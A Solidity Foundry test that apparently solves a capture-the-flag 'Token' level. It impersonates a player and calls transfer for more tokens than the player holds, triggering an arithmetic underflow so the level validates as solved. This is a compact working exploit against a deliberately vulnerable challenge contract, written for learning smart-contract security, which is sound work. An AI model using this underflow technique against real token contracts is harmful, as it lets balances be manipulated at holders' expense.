// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import {TokenFactory} from "src/levels/TokenFactory.sol";

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);

    function balanceOf(address _owner) external view returns (uint256 balance);
}

contract TokenTest is Test {
    TokenFactory public level;
    IToken public target;
    address public player;

    function setUp() public {
        // ----------------------------------
        // Create level instance
        // ----------------------------------
        level = new TokenFactory();
        player = makeAddr("PLAYER");
        target = IToken(level.createInstance(player));
    }

    function test_Token() public {
        // ----------------------------------
        // Initiate attack
        // ----------------------------------
        vm.prank(player);

        // arithmetic underflow occurs
        target.transfer(address(0), 21);

        // ----------------------------------
        // Validate
        // ----------------------------------
        bool success = level.validateInstance(payable(address(target)), player);
        assertEq(success, true);
    }
}
